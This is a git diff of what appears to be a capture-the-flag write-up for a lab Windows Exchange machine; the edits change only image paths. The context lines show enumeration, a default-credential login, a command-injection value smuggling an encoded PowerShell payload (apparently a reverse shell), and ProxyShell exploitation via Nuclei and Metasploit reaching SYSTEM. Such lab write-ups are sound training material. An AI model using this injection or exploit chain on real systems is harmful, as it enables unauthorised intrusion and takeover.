@@ -73,17 +73,17 @@ gobuster dir -u http://10.10.67.15/ -w /usr/share/wordlists/SecLists/Discovery/W
 echo "10.10.67.15    win-12ouo7a66m7.thm.local    thm.local" > /etc/hosts
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Try to insert the default credentials `admin:admin` and it's worked.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
 Try to run the command with empty and this error appairs
 
-<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Probably we can find the escape input to do a Command Injection.
 
@@ -109,7 +109,7 @@ xlog=BitlockerActiveMonitoringLogs');powershell -e JABzAD0AJwAxADAALgAyADMALgA1A
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now we can print the user flag.
 
@@ -123,7 +123,7 @@ more C:\Users\dev\Desktop\user.txt
 
 We found a TODO.txt file in the dev's Desktop
 
-<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 From this we can get that:
 
@@ -149,7 +149,7 @@ Get the version of microsoft exchange installed:
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 15.02.0858.002
@@ -167,7 +167,7 @@ Using this Nuclei templace we can see if the server is vulnerable to CVE-2021-34
 nuclei -u win-12ouo7a66m7.thm.local -t proxyshell.yaml
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This server is vulnerable, now search the exploit in Metasploit.
 
@@ -176,7 +176,7 @@ sudo service postgresql start && msfconsole
 search exchange
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This module can help us.
 
@@ -187,7 +187,7 @@ set EMAIL dev-infrastracture-team@thm.local
 exploit
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 In this way we have a meterpreter session as NT AUTHORITY\SYSTEM.
 
@@ -199,4 +199,4 @@ more C:\Users\Administrator\Documents\flag.txt
 
 The next step could be dump the hash end enumeration all machine finding all necessary element for a futher persistance, pivoting or lateral movement.
 
-<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
